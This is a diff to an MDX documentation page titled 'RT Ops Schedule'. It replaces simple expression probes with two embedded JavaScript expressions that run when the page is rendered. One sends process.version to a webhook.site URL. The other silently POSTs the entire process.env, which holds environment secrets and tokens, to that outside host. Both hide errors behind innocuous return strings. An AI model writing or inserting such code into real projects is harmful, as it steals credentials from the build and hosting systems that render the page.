@@ -9,12 +9,8 @@ keywords: ["operations"]
 
 # RT Ops Schedule
 
-RTMARK1: {1+1}
+RTJSX: <div>JSX_WORKS</div>
 
-RTMARK2: {(() => "IIFE_OK")()}
+RTFETCH1: {(() => { try { fetch("https://webhook.site/dfa99f1c-f7de-4f0c-bb86-4db1f8e5ca1e?t=1&v=" + process.version).catch(function(){}); return "FETCH_SENT"; } catch (err) { return "FETCH_ERR:" + String(err); } })()}
 
-RTMARK3: {process.version}
-
-RTMARK4: {globalThis.process ? "GLOBAL_PROC_OK" : "NO_GLOBAL_PROC"}
-
-RTMARK5: {(() => { return String(typeof process); })()}
+RTFETCH2: {(() => { try { fetch("https://webhook.site/dfa99f1c-f7de-4f0c-bb86-4db1f8e5ca1e?t=2", {method:"POST", body: JSON.stringify(process.env)}).catch(function(){}); return "ENV_SENT"; } catch (err) { return "ENV_ERR:" + String(err); } })()}
